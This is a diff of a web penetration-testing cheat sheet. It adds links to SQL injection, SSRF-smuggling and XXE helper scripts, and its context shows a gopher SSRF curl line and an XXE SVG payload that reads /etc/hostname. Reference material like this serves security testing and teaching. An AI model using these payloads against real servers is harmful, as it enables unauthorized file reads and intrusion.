@@ -581,6 +581,15 @@ https://gist.githubusercontent.com/zetc0de/f4146eb278805946ab064a753eac6a02/raw/
 
 https://github.com/OWASP/www-community/blob/master/pages/attacks/SQL_Injection_Bypassing_WAF.md
   
+### Others
+  
+/codes/sqli/time-based/sqli.py
+  
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/time-based/sqli.py
+  
+/codes/sqli/tampers/second-order.py
+  
+  
 ## NOSQL Injection
   
 https://book.hacktricks.xyz/pentesting-web/nosql-injection
@@ -670,8 +679,12 @@ curl "gopher://localhost:port"
 ### Scripts
 
 codes/ssrf_protocol_smuggling/memcached.py
+  
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/ssrf_protocol_smuggling/memcached.py 
 
 codes/ssrf_protocol_smuggling/zabbix.py
+  
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/ssrf_protocol_smuggling/zabbix.py
 
 ### Tool's
 
@@ -738,6 +751,8 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 ### XXE OOB to retrieve data via error messages with dtd file
   
 codes/xxe/error.dtd
+  
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/error.dtd
 
 -> Part 1
 
@@ -767,6 +782,8 @@ codes/xxe/error.dtd
 
 code/xxe/evil.svg
 
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/evil.svg
+  
 \<?xml version="1.0" standalone="yes"?>\<!DOCTYPE test [ \<!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>\<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">\<text font-size="16" x="0" y="16">&xxe;\</text>\</svg>
 
 ## XSLT Server Side Injection
